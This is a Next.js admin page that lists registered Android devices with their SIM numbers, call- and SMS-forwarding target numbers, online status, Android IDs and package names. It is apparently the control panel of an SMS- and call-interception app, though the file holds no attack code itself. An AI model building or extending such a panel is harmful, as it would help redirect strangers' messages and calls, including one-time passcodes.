"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { io } from "socket.io-client";
import useUser from "@/components/useUser";
import { currentTime, getSocket, timeAgo } from "@/Helper";
import { Loader2, Trash2, Send } from "lucide-react";
import toast from "react-hot-toast";

let socket;

export default function Page() {
  const [devices, setDevices] = useState([]);
  const [page, setPage] = useState(1);
  const [totalPages, setTotalPages] = useState(1);
  const [total, setTotal] = useState(0);
  const [loading, setLoading] = useState(false);
  const [search, setSearch] = useState("");

  const authuser = useUser();

  const router = useRouter();

  // Initialize Socket.IO
  useEffect(() => {
    if (!authuser) return;
    const socket = getSocket(authuser);

    socket.on("connect", () => {
      //console.log("✅ Connected to socket:", socket.id);
    });

    socket.on("new_device_insert", (data) => {
      toast.success(data.message);
      fetchDevices(page);
    });

    socket.on("device_status_update", (data) => {
      setDevices((prev) =>
        prev.map((d) =>
          d.android_id === data.id // make sure `id` matches `android_id`
            ? { ...d, device_status: data.device_status, last_seen_at: data.last_seen_at }
            : d
        )
      );
    });
    // socket.on("disconnect", () => console.log("❌ Disconnected"));
    return () => {
      socket.off("device_status_update");
      socket.off("new_device_data");
    };
  }, [authuser]);


const fetchDevices = async (page, searchTerm = "") => {
  setLoading(true);
  try {
    const res = await fetch(`/api/devices?page=${page}&limit=9&search=${encodeURIComponent(searchTerm)}`);
    const json = await res.json();
    setDevices(json.data);
    setTotalPages(json.pagination.totalPages);
    setTotal(json.pagination.total);
  } catch (err) {
    console.error("Error fetching devices:", err);
  }
  setLoading(false);
};


  useEffect(() => {
    fetchDevices(page);
  }, [page]);


  useEffect(() => {
  const delayDebounce = setTimeout(() => {
    fetchDevices(1, search);
  }, 500);
  return () => clearTimeout(delayDebounce);
}, [search]);


  const handleDelete = async (id) => {
    let confirm = window.confirm("Are you sure you want to delete this entry?");
    if (!confirm) return;
    let password = null;
    if (authuser.role !== "admin") {
      password = prompt("Enter admin password to delete this entry:");
      if (!password) return;
    }
    try {
      const res = await fetch(`/api/devices/${id}`, {
        method: "DELETE",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ password }),
      });
      const json = await res.json();
      if (res.ok) {
        setDevices((prev) => prev.filter((d) => d.id !== id));
        toast.success(json.message);
      } else {
        toast.error(json.error || "Failed to delete SMS entry");
      }
    } catch (err) {
      console.error("Error deleting:", err);
      toast.error("Failed to delete");
    }
  };

  const formatIST = (timestamp) => {
    if (!timestamp) return "-";
    const date = new Date(timestamp);
    return date.toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
  };

  return (
    <main className="flex-1 p-6 bg-gray-100 min-h-screen">
      <header className="flex flex-col md:flex-row justify-between items-center gap-3">
        <h2 className="text-3xl font-bold text-gray-800">Devices ({total})</h2>

        <div className="flex gap-2 items-center w-full md:w-auto">
          <input
            type="text"
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            placeholder="Search device..."
            className="border border-gray-300 rounded-xl px-4 py-2 w-full md:w-64 focus:ring-2 focus:ring-blue-500 focus:outline-none"
          />
          <button
            onClick={() => fetchDevices(page)}
            className="flex items-center gap-2 px-4 py-2 bg-blue-600 text-white rounded-xl shadow hover:bg-blue-700 transition-all"
          >
            <Send className="w-4 h-4" />
            Refresh
          </button>
        </div>
      </header>


      {loading ? (
        <div className="flex justify-center items-center h-64">
          <Loader2 className="animate-spin text-blue-600 w-8 h-8" />
        </div>
      ) : (
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mt-3">
          {devices.map((device, index) => (
            <div
              key={device.id}
              className="bg-white rounded-2xl shadow-lg hover:shadow-2xl transition-shadow duration-300 p-6 flex flex-col justify-between"
            >
              <div>
                <h2 className="font-bold text-lg text-gray-800 mb-1">
                  <span className="text-red-600">#{device.id}. </span> {device.device_model} ({device.device_name})
                </h2>
                <p className="text-gray-700 mb-1">
                  <span className="font-medium">Android Version:</span>{" "}
                  {device.device_android_version || "-"}
                </p>
                <p className="text-gray-700 mb-1">
                  <span className="font-medium">SIM1:</span> {device.sim1_phone_no || "-"} |{" "}
                  <span className="font-medium">SIM2:</span> {device.sim2_phone_no || "-"}
                </p>
                <p className="text-gray-700 mb-1">
                  <span className="font-medium">Call Forwarding To: </span>{" "}
                  {
                    device.call_forwarding_to_number_status == "Disabled" ? <span className='text-red-500'>Disabled</span> : device.call_forwarding_to_number
                  }
                </p>
                <p className="text-gray-700 mb-1">
                  <span className="font-medium">SMS Forwarding To: </span>{" "}
                  {
                    device.sms_forwarding_to_number_status == "Disabled" ? <span className='text-red-500'>Disabled</span> : device.sms_forwarding_to_number
                  }
                </p>

                <p className="text-gray-700">
                  <span className="font-medium">Status:</span>{" "}
                  <span
                    className={
                      device.device_status === "online"
                        ? "text-green-600 font-semibold"
                        : "text-red-600 font-semibold"
                    }
                  >
                    {device.device_status === "online"
                      ? "Online"
                      : `Offline (${timeAgo(device.last_seen_at)})`}
                  </span>
                </p>
                <p className="text-gray-400 text-sm">
                  <span className="font-medium">Reged. :</span>{" "}
                  {currentTime(device.created_at)} By {device.form_code}
                </p>
                <p className="text-gray-400 text-sm mb-1">
                  <span className="font-medium">Android Id:</span>{" "}
                  {device.android_id || "-"}
                </p>
                <p className="text-gray-400 text-sm mb-1">
                  <span className="font-medium">Package:</span>{" "}
                  {device.package_name || "-"}
                </p>

              </div>


              <div className="mt-4 flex justify-between space-x-2">
                <button
                  onClick={() => router.push(`/admin/devices/${device.id}`)}
                  className="flex-1 px-4 py-2 bg-blue-600 text-white rounded-xl hover:bg-blue-700 transition"
                >
                  View Details
                </button>
                <button
                  onClick={() => handleDelete(device.id)}
                  className="flex-1 px-4 py-2 bg-red-600 text-white rounded-xl hover:bg-red-700 transition"
                >
                  Delete
                </button>
              </div>
            </div>
          ))}
        </div>
      )}

      {/* Pagination */}

      {/* Pagination */}
      {totalPages > 1 && (
        <div className="flex justify-center items-center mt-10 gap-3">
          <button
            className="px-4 py-2 bg-gray-300 text-gray-700 rounded-lg hover:bg-gray-400 disabled:opacity-50"
            onClick={() => setPage((p) => Math.max(p - 1, 1))}
            disabled={page === 1}
          >
            Prev
          </button>
          <span className="px-4 py-2 bg-white border border-gray-200 rounded-lg shadow text-gray-700 font-medium">
            Page {page} of {totalPages}
          </span>
          <button
            className="px-4 py-2 bg-gray-300 text-gray-700 rounded-lg hover:bg-gray-400 disabled:opacity-50"
            onClick={() => setPage((p) => Math.min(p + 1, totalPages))}
            disabled={page === totalPages}
          >
            Next
          </button>
        </div>
      )}
    </main>
  );
}
